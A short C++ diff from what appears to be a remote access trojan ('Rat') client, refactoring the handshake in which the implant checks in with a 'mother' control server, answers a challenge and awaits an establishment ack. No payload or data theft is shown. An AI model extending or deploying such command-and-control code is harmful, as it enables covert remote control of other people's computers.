@@ -67,22 +67,26 @@ bool Rat::EstablishConnection() {
 
     RatPacketUtils::Send(mother, RatPacket("imgettingratty", MsgType::INIT));
 
-    char buffer[1024] = {0};
-    int bytesReceived = recv(mother, buffer, sizeof(buffer), 0);
-    if (bytesReceived > 0) {
+
+    // char buffer[1024] = {0};
+    // int bytesReceived = recv(mother, buffer, sizeof(buffer), 0);
+    std::pair<RatPacket,bool> recvPacket = RatPacketUtils::Recv(mother);
+
+    if (recvPacket.second) {
         std::cout << "[*] Recv Challenge. . ." << std::endl;
 
         // recv challenge
-        std::string challData = std::string(buffer, bytesReceived);
-        RatPacket challPacket(challData.c_str());
-        std::string code = challPacket.GetPacketMessage();
+        // std::string challData = std::string(buffer, bytesReceived);
+        // RatPacket challPacket(challData.c_str());
+        std::string code = recvPacket.first.GetPacketMessage();
 
         std::cout << "[*] Replying to Challenge. . ." << std::endl;
         // reply to it
         RatPacketUtils::Send(mother, RatPacket(code, MsgType::INIT));
 
         // final ack of before possible estab
-        bytesReceived = recv(mother, buffer, sizeof(buffer), 0);
+        char buffer[1024] = {0};
+        int bytesReceived = recv(mother, buffer, sizeof(buffer), 0);
         if (bytesReceived > 0) {
             std::cout << "[*] Recv Estab Ack. . ." << std::endl;
             std::string ackData = std::string(buffer, bytesReceived);
